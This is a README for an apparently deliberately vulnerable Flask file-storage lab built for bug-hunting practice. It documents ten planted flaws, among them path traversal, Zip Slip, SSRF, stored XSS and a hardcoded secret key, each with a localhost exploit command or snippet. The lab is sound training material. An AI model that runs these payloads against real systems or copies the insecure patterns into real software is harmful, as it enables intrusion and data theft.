# Tegh Cloud - Enterprise File Storage
> **Secure Storage for the Modern Enterprise** (Simulated Vulnerable Lab)

Tegh Cloud is a "production-ready" file storage and CDN application built with Python Flask. It features a professional industrial UI, background file processing, and a suite of **10 intentional advanced vulnerabilities** designed for security research and bug hunting competitions.

---

## 🚀 Getting Started

### Installation
No external database is required (uses SQLite).
```bash
# Install dependencies (if needed)
pip install flask sqlalchemy requests

# Run the application
python app.py
```

### Access Points
- **Landing Page**: `http://localhost:5000/`
- **Login**: `http://localhost:5000/login`
- **Dashboard**: `http://localhost:5000/dashboard` (Requires Login)
- **API**: `http://localhost:5000/api/`

---

## 💀 Vulnerability & Exploitation Guide

This application intentionally includes the following vulnerabilities. Use this guide to verify them.

### 1. User Enumeration
**Vulnerability**: The authentication logic validates the email address before checking the password, returning distinct error messages.
- **Exploit**:
    ```bash
    # Check for invalid user
    curl -X POST -d "email=nonexistent@tegh.com" -d "password=x" http://localhost:5000/login
    # Output: User not found

    # Check for valid user
    curl -X POST -d "email=test@tegh.com" -d "password=x" http://localhost:5000/login
    # Output: Invalid password
    ```

### 2. Cache Control Misconfiguration
**Vulnerability**: Sensitive API endpoints return `Cache-Control: public`, meaning shared proxies/caches will store the JSON response containing private file lists.
- **Exploit**:
    ```bash
    curl -I http://localhost:5000/api/files
    # Check Header: Cache-Control: public, max-age=3600
    ```

### 3. CDN Auth Bypass (IDOR)
**Vulnerability**: While the dashboard requires a session, the CDN endpoint (`/cdn/<path>`) serves files to purely unauthenticated requests throughout.
- **Exploit**:
    1. Login and upload a file named `secret.txt`.
    2. Note the path (e.g., `/cdn/uploads/secret.txt`).
    3. Open an Incognito window or use curl without cookies:
       ```bash
       curl http://localhost:5000/cdn/uploads/secret.txt
       ```
    4. The file content is returned.

### 4. Upload Validation Bypass
**Vulnerability**: The `allowed_file` function uses weak logic. It allows double extensions like `.php.jpg` or trusts the `Content-Type` header if the extension check fails.
- **Exploit**:
    ```bash
    # Upload a fake "image" that allows code execution (simulated)
    curl -X POST -F "file=@exploit.php.jpg" -F "folder=uploads" http://localhost:5000/api/upload
    ```

### 5. Web Root Upload (Stored XSS / RCE)
**Vulnerability**: Uploads are stored in a public-accessible directory. If an attacker uploads an HTML file, it will render in the browser (Stored XSS).
- **Exploit**:
    1. Create `xss.html`: `<script>alert(document.domain)</script>`.
    2. Upload it.
    3. Visit `http://localhost:5000/cdn/uploads/xss.html`. The script executes.

### 6. Arbitrary File Read (Path Traversal)
**Vulnerability**: The `/api/download` endpoint takes a `path` parameter that is directly used to open files. While the developers added a check to hide `app.py`, they failed to disable the traversal itself.
- **Exploit**:
    ```bash
    # Read system files (Windows example) - This WORKS
    curl "http://localhost:5000/api/download?path=../../../../../../windows/win.ini"

    # Read the application source code - This FAILs (403 Forbidden)
    curl "http://localhost:5000/api/download?path=../app.py"
    ```

### 7. Arbitrary File Write (Path Traversal)
**Vulnerability**: The upload endpoint takes a `folder` parameter that is joined unsafely with the filename.
- **Exploit**:
    ```bash
    # Write a file to the application root (outside uploads/)
    curl -X POST -F "file=@hacked.txt" -F "folder=../" http://localhost:5000/api/upload
    ```

### 8. Zip Slip
**Vulnerability**: The background worker automatically extracts ZIP files without validating that the file paths are within the target directory.
- **Exploit**:
    1. Create a malicious ZIP using Python:
       ```python
       import zipfile
       z = zipfile.ZipFile('slip.zip', 'w')
       z.writestr('../pwned_by_zip.txt', 'HACKED')
       z.close()
       ```
    2. Upload `slip.zip`.
    3. Access `http://localhost:5000/cdn/../pwned_by_zip.txt` (or verify file existence on disk).

### 9. SSRF via File Processing
**Vulnerability**: The background worker scans text files for URLs and automatically sends GET requests to them.
- **Exploit**:
    1. Create `ssrf.txt` containing: `http://localhost:5000/internal-metadata`.
    2. Upload it.
    3. The server will fetch the URL. Check console logs or network traffic to confirm the request was made.

### 10. Weak Secret Key (Session Forgery)
**Vulnerability**: The Flask `SECRET_KEY` is hardcoded as `'tegh-cloud-super-secret-key-12345'`.
- **Exploit**: An attacker can use `flask-unsign` or similar tools to forge a valid session cookie for any user ID.

---

## 🏗️ Architecture
- **Backend**: Python Flask
- **Database**: SQLite (`database.db`)
- **Frontend**: Embedded HTML/CSS with "Industrial Light" Design System.
- **Workers**: `threading` based background tasks.

&copy; 2026 Tegh Cloud Inc. | Security Research Lab
